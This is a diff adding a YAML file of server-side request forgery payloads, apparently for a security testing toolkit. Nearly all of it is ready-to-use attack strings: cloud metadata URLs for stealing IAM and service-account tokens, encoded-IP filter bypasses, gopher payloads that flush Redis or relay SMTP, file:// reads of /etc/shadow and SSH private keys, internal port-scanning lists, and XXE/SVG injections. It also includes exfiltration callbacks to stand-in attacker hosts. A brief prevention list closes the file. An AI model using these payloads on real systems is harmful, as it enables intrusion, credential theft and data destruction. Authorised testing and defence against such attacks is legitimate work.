@@ -1,0 +1,304 @@
+# Payloads - Server-Side Request Forgery (SSRF)
+# SSRF attack payloads for accessing internal resources
+
+payload_category: "ssrf"
+version: "1.0"
+description: "Server-Side Request Forgery payloads to access internal networks, cloud metadata, and bypass restrictions"
+
+# Basic SSRF Payloads
+basic_ssrf:
+  localhost:
+    - "http://localhost"
+    - "http://127.0.0.1"
+    - "http://0.0.0.0"
+    - "http://[::1]"
+    - "http://[0:0:0:0:0:0:0:1]"
+  
+  internal_networks:
+    - "http://192.168.1.1"
+    - "http://10.0.0.1"
+    - "http://172.16.0.1"
+    - "http://169.254.169.254"  # AWS metadata
+  
+  file_protocol:
+    - "file:///etc/passwd"
+    - "file:///c:/windows/win.ini"
+    - "file:///proc/self/environ"
+
+# Cloud Metadata Endpoints
+cloud_metadata:
+  aws:
+    imdsv1:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://169.254.169.254/latest/user-data"
+      - "http://169.254.169.254/latest/meta-data/hostname"
+      - "http://169.254.169.254/latest/meta-data/public-ipv4"
+    
+    imdsv2:
+      description: "Requires session token via PUT request"
+      token_request: "curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
+      metadata_request: "curl -H 'X-aws-ec2-metadata-token: TOKEN' http://169.254.169.254/latest/meta-data/"
+    
+    sensitive_paths:
+      - "/latest/meta-data/iam/security-credentials/role-name"
+      - "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
+      - "/latest/dynamic/instance-identity/document"
+  
+  azure:
+    endpoints:
+      - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    
+    headers_required:
+      - "Metadata: true"
+    
+    sensitive_data:
+      - "Subscription ID"
+      - "Resource group"
+      - "VM name"
+      - "Access tokens for Azure resources"
+  
+  gcp:
+    endpoints:
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://169.254.169.254/computeMetadata/v1/"
+      - "http://metadata/computeMetadata/v1/"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    
+    headers_required:
+      - "Metadata-Flavor: Google"
+    
+    sensitive_paths:
+      - "/computeMetadata/v1/project/project-id"
+      - "/computeMetadata/v1/instance/service-accounts/default/token"
+      - "/computeMetadata/v1/instance/attributes/"
+  
+  digitalocean:
+    - "http://169.254.169.254/metadata/v1.json"
+    - "http://169.254.169.254/metadata/v1/id"
+    - "http://169.254.169.254/metadata/v1/user-data"
+  
+  alibaba:
+    - "http://100.100.100.200/latest/meta-data/"
+    - "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+
+# Bypass Techniques
+bypass_filters:
+  ip_obfuscation:
+    decimal:
+      - "http://2130706433" # 127.0.0.1 in decimal
+      - "http://3232235521" # 192.168.0.1 in decimal
+    
+    octal:
+      - "http://0177.0.0.1"  # 127.0.0.1 in octal
+      - "http://0300.0250.0.1"  # 192.168.0.1 in octal
+    
+    hexadecimal:
+      - "http://0x7f.0x0.0x0.0x1"  # 127.0.0.1 in hex
+      - "http://0x7f000001"  # 127.0.0.1 in full hex
+    
+    mixed:
+      - "http://127.1"  # 127.0.0.1 (shortened)
+      - "http://127.0.1"  # 127.0.0.1 (shortened)
+      - "http://0x7f.1"  # Mixed hex and decimal
+  
+  dns_rebinding:
+    - "http://spoofed.burpcollaborator.net"  # Resolves to internal IP after initial check
+    - "http://1ynrnhl.xip.io"  # Wildcard DNS to 127.0.0.1
+    - "http://127.0.0.1.nip.io"
+  
+  url_encoding:
+    - original: "http://127.0.0.1"
+      encoded: "http://%31%32%37%2e%30%2e%30%2e%31"
+    - original: "http://localhost"
+      encoded: "http://%6c%6f%63%61%6c%68%6f%73%74"
+  
+  double_encoding:
+    - "http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31"  # Double encoded 127.0.0.1
+  
+  unicode_encoding:
+    - original: "http://127.0.0.1"
+      encoded: "http://\\u0031\\u0032\\u0037.\\u0030.\\u0030.\\u0031"
+  
+  bypass_localhost_filters:
+    - "http://localhost.localdomain"
+    - "http://127.0.0.1.xip.io"
+    - "http://127.0.0.1.nip.io"
+    - "http://127.0.0.1.sslip.io"
+    - "http://[::]:80/"
+    - "http://[0:0:0:0:0:ffff:127.0.0.1]"
+  
+  protocol_smuggling:
+    - "dict://127.0.0.1:6379/info"  # Redis
+    - "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"  # Redis commands
+    - "sftp://127.0.0.1:22"
+    - "ldap://127.0.0.1:389"
+    - "tftp://127.0.0.1:69"
+  
+  redirect_bypass:
+    - "Create URL that redirects to internal resource"
+    - "http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/"
+  
+  crlf_injection:
+    - "http://127.0.0.1%0d%0aHeader:value"
+    - "http://example.com%0d%0aHost:%20127.0.0.1"
+
+# Protocol-Based Attacks
+protocol_attacks:
+  gopher:
+    description: "Send arbitrary protocols over HTTP"
+    redis_flush:
+      - "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+    
+    smtp:
+      - "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com%0d%0aRCPT%20TO:victim@example.com"
+    
+    memcached:
+      - "gopher://127.0.0.1:11211/_stats"
+  
+  dict:
+    - "dict://127.0.0.1:6379/info"  # Query Redis
+    - "dict://127.0.0.1:11211/stats"  # Query Memcached
+  
+  file:
+    linux:
+      - "file:///etc/passwd"
+      - "file:///etc/shadow"
+      - "file:///root/.ssh/id_rsa"
+      - "file:///proc/self/environ"
+      - "file:///var/log/apache2/access.log"
+    
+    windows:
+      - "file:///c:/windows/win.ini"
+      - "file:///c:/windows/system32/drivers/etc/hosts"
+      - "file:///c:/inetpub/wwwroot/web.config"
+
+# Port Scanning via SSRF
+port_scanning:
+  technique: "Test different ports to map internal network"
+  payloads:
+    - "http://192.168.1.1:22"   # SSH
+    - "http://192.168.1.1:80"   # HTTP
+    - "http://192.168.1.1:443"  # HTTPS
+    - "http://192.168.1.1:3306" # MySQL
+    - "http://192.168.1.1:5432" # PostgreSQL
+    - "http://192.168.1.1:6379" # Redis
+    - "http://192.168.1.1:8080" # HTTP-Alt
+    - "http://192.168.1.1:9200" # Elasticsearch
+  
+  detection: "Response time differences indicate open/closed ports"
+  open_port: "Connection established (fast response or timeout)"
+  closed_port: "Connection refused (immediate response)"
+
+# Blind SSRF Detection
+blind_ssrf:
+  out_of_band:
+    - "http://burpcollaborator.net"
+    - "http://webhook.site/unique-id"
+    - "http://attacker.com/ssrf-callback"
+  
+  dns_exfiltration:
+    - "http://stolen-data.attacker.com"
+    - "http://metadata-response.attacker.com"
+  
+  timing_based:
+    - "http://slow-server.attacker.com"  # responds after 10 seconds
+    - "http://timing-test.attacker.com"  # Compare response times to detect SSRF
+
+# Internal Service Exploitation
+internal_services:
+  redis:
+    - "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+    - "dict://127.0.0.1:6379/info"
+    - "http://127.0.0.1:6379"
+  
+  elasticsearch:
+    - "http://127.0.0.1:9200/_cluster/health"
+    - "http://127.0.0.1:9200/_cat/indices"
+    - "http://127.0.0.1:9200/_search?q=*"
+  
+  kubernetes:
+    - "https://kubernetes.default.svc"
+    - "http://127.0.0.1:10250/pods"  # Kubelet API
+    - "http://127.0.0.1:8001/api/v1/namespaces/default/pods"
+  
+  docker:
+    - "http://localhost:2375/containers/json"  # Docker API
+    - "http://localhost:2375/images/json"
+  
+  consul:
+    - "http://127.0.0.1:8500/v1/catalog/services"
+    - "http://127.0.0.1:8500/v1/kv/"  # Key-value store
+
+# Advanced SSRF Exploitation
+advanced:
+  time_based_blind:
+    description: "Detect SSRF via response timing"
+    fast_response: "http://google.com (open, fast)"
+    slow_response: "http://192.168.1.1:9999 (closed, timeout)"
+  
+  response_size:
+    description: "Detect SSRF via response size differences"
+    large_response: "http://example.com (full HTML page)"
+    small_response: "http://192.168.1.1:22 (SSH banner)"
+  
+  webhook_exfiltration:
+    - "http://webhook.site/unique-id?data=exfiltrated_metadata"
+    - "http://attacker.com/log?metadata=ENCODED_DATA"  # Replace with actual encoded data
+
+# SSRF Chaining
+chaining:
+  ssrf_to_rce:
+    - "SSRF to Redis → Write webshell via gopher"
+    - "SSRF to Elasticsearch → Execute Groovy script"
+    - "SSRF to cloud metadata → Steal IAM credentials → AWS API access"
+  
+  ssrf_to_xss:
+    - "SSRF to internal service returning JavaScript"
+    - "Reflected in page without sanitization"
+
+# PDF/SVG/XML SSRF
+file_upload_ssrf:
+  pdf_ssrf:
+    payload: |
+      <html>
+      <img src="http://169.254.169.254/latest/meta-data/">
+      </html>
+    description: "PDF generator fetches image from metadata endpoint"
+  
+  svg_ssrf:
+    payload: |
+      <svg xmlns="http://www.w3.org/2000/svg">
+      <image href="http://169.254.169.254/latest/meta-data/"/>
+      </svg>
+  
+  xml_ssrf:
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+      ]>
+      <root>&xxe;</root>
+
+prevention:
+  - "Whitelist allowed domains and protocols"
+  - "Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)"
+  - "Block localhost (127.0.0.1, ::1)"
+  - "Block cloud metadata endpoints (169.254.169.254)"
+  - "Use network segmentation"
+  - "Disable unnecessary protocols (file, gopher, dict)"
+  - "Validate and sanitize URLs"
+  - "Use DNS resolution checks"
+
+tools:
+  - "Burp Collaborator: Out-of-band detection"
+  - "SSRFmap: Automated SSRF exploitation"
+  - "Gopherus: Generate gopher payloads"
+  - "wget/curl: Manual testing"
+
+references:
+  - "OWASP Top 10:2025 A01 (Broken Access Control - includes SSRF)"
+  - "PortSwigger: Server-side request forgery (SSRF)"
+  - "CWE-918: Server-Side Request Forgery"
+  - "HackerOne SSRF reports"
